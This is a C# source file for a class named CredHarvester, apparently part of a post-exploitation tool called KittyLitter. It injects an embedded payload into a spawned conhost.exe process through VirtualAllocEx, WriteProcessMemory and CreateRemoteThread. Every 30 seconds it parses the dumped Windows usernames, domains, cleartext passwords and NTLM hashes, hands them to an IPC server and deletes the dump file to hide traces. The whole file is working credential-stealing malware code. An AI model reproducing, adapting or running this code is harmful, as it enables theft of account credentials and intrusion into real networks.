using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using KittyLitter.WinAPI;
using System.IO;

namespace KittyLitter
{
    class CredHarvester
    {
        public static void Start()
        {
            while (true)
            {
                Safety.ProcessWithAnonymousPipeIO sacProcess = null;
                try
                {
                    uint bytesWritten = 0;
                    sacProcess = new Safety.ProcessWithAnonymousPipeIO("C:\\Windows\\System32\\conhost.exe", "0x4");
                    var hProcess = sacProcess.hProcess;
                    IntPtr ep = Kernel32.VirtualAllocEx(hProcess, IntPtr.Zero, (ulong)Properties.Resources.lsamanager.Length, Kernel32.AllocationType.Commit, Kernel32.MemoryProtection.ExecuteReadWrite);
                    if (Kernel32.WriteProcessMemory(hProcess, ep, Properties.Resources.lsamanager, (uint)Properties.Resources.lsamanager.Length, out bytesWritten))
                    {
                        IntPtr threadId = IntPtr.Zero;
                        var crt = Kernel32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, ep, IntPtr.Zero, 0, threadId);
                        Kernel32.WaitForSingleObject(crt, 0xFFFFFFFF);
                    }
                } catch { }
                finally
                {
                    if (sacProcess != null || sacProcess.hProcess != IntPtr.Zero)
                    {
                        try
                        {
                            sacProcess.CloseHandles();
                            System.Diagnostics.Process.GetProcessById(sacProcess.PID).Kill();
                        } catch { }
                    }
                }
                ParseCredentials();
                System.Threading.Thread.Sleep(30000);
            }
        }

        private static void ParseCredentials()
        {
            try
            {
                string masterMessage = "";
                var fileContents = File.ReadAllText("C:\\Windows\\Temp\\debug.txt");
                var fileLines = fileContents.Split('\n');
                string username = "";
                string domain = "";
                string password = "";
                string ntlm = "";
                string sha = "";
                int j = -1;
                for(int i = 0; i < fileLines.Length; i++)
                {
                    if (fileLines[i].Contains("Username") && (i + 2 < fileLines.Length && (fileLines[i+2].Contains("Password") || fileLines[i+2].Contains("NTLM"))))
                    {
                        if (fileLines[i].Split(':').Length > 1)
                        {
                            j = i;
                            username = fileLines[i].Split(':')[1].Trim();
                        } else
                        {
                            j = -1;
                        }
                    }
                    if (j > -1 && (j + 1) == i)
                    {
                        if (fileLines[i].Split(':').Length > 1)
                        {
                            domain = fileLines[i].Split(':')[1].Trim();
                        }
                    } else if (j > -1 && (j+2) == i)
                    {
                        if (fileLines[i].Split(':').Length > 1)
                        {
                            var data = fileLines[i].Split(':');
                            var tempData = new List<string>();
                            for(int k = 1; k < data.Length; k++)
                            {
                                tempData.Add(data[k]);
                            }
                            password = string.Join(":", tempData.ToArray());
                            if (password.Contains("(null)") && fileLines[i].Contains("Password"))
                            {
                                username = "";
                                domain = "";
                                password = "";
                                j = -1;
                            } else
                            {
                                //password = data;
                                if (fileLines[i].Contains("Password"))
                                {
                                    string message = String.Format("Domain: {0}\tUsername: {1}\tPassword: {2}\n", domain, username, password);
                                    masterMessage += message;
                                } else
                                {
                                    string message = String.Format("Domain: {0}\tUsername: {1}\tNTLM: {2}\n", domain, username, password);
                                    masterMessage += message;
                                }
                                username = "";
                                domain = "";
                                password = "";
                            }
                        }
                    }
                }
                IPCServers.IPCServer.SetMessage(masterMessage);
                System.IO.File.Delete("C:\\Windows\\Temp\\debug.txt");
            } catch
            {

            }
        }
    }
}
